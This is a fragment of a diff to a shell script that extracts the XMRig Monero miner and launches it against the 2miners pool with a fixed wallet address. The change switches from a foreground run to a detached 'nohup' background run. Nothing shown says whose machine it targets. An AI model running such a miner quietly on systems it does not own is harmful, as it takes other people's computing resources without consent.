@@ -8,6 +8,6 @@ tar -xf xmrig-6.11.0-linux-x64.tar.gz
 
 cd xmrig-6.11.0
 
-./xmrig -o xmr.2miners.com:2222 -u 86dKUz5Uk1edN2Sm8bhkJhKrPU1DfmRqN83nbynUDZZp7BRpXD8wjTzSKKHWFozwo5Fhd3zKweCWb4MQRk6ok8m6DdhLcxQ
+#./xmrig -o xmr.2miners.com:2222 -u 86dKUz5Uk1edN2Sm8bhkJhKrPU1DfmRqN83nbynUDZZp7BRpXD8wjTzSKKHWFozwo5Fhd3zKweCWb4MQRk6ok8m6DdhLcxQ
 
-#nohup ./xmrig -o xmr.2miners.com:2222 -u 86dKUz5Uk1edN2Sm8bhkJhKrPU1DfmRqN83nbynUDZZp7BRpXD8wjTzSKKHWFozwo5Fhd3zKweCWb4MQRk6ok8m6DdhLcxQ &
+nohup ./xmrig -o xmr.2miners.com:2222 -u 86dKUz5Uk1edN2Sm8bhkJhKrPU1DfmRqN83nbynUDZZp7BRpXD8wjTzSKKHWFozwo5Fhd3zKweCWb4MQRk6ok8m6DdhLcxQ &
